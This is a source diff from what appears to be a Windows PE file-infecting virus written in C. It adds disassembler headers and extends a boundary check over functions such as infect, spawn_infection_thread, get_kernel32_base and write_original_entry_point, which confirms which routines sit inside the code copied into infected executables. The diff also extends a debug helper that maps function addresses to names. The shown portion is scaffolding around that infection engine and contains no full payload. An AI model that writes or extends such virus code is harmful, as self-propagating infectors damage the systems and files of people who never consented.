@@ -6,6 +6,9 @@
 #include "code_end.h"
 #include "delta.h"
 #include "disasm/analysis/analysis.h"
+#include "disasm/analysis/block.h"
+#include "disasm/analysis/call.h"
+#include "disasm/analysis/function.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -68,8 +71,7 @@ static uint8_t check_functions(void) {
     return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
            IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
            IN_BOUNDARIES(checksum) && IN_BOUNDARIES(spawn_infection_thread) &&
-		   IN_BOUNDARIES(infect) &&
-           IN_BOUNDARIES(get_original_entry_point) &&
+           IN_BOUNDARIES(infect) && IN_BOUNDARIES(get_original_entry_point) &&
            IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
            IN_BOUNDARIES(align_value) && IN_BOUNDARIES(get_nt_header) &&
            IN_BOUNDARIES(get_section_header) &&
@@ -80,14 +82,26 @@ static uint8_t check_functions(void) {
            IN_BOUNDARIES(get_peb) && IN_BOUNDARIES(get_image_base) &&
            IN_BOUNDARIES(get_kernel32_base) &&
            IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero) &&
-           IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive);
+           IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive) &&
+           IN_BOUNDARIES(get_function_pointer) && IN_BOUNDARIES(setup_disasm) &&
+           IN_BOUNDARIES(set_next_address) &&
+           IN_BOUNDARIES(get_current_instruction_size);
 }
 
 static const char *get_function_name(void *addr) {
+
     if (addr == get_string)
         return "get_string";
+    else if (addr == get_function_pointer)
+        return "get_function_pointer";
     else if (addr == get_string_length)
         return "get_string_length";
+    else if (addr == setup_disasm)
+        return "setup_disasm";
+    else if (addr == set_next_address)
+        return "set_next_address";
+    else if (addr == get_current_instruction_size)
+        return "get_current_instruction_size";
     else if (addr == infect)
         return "infect";
     else if (addr == checksum)
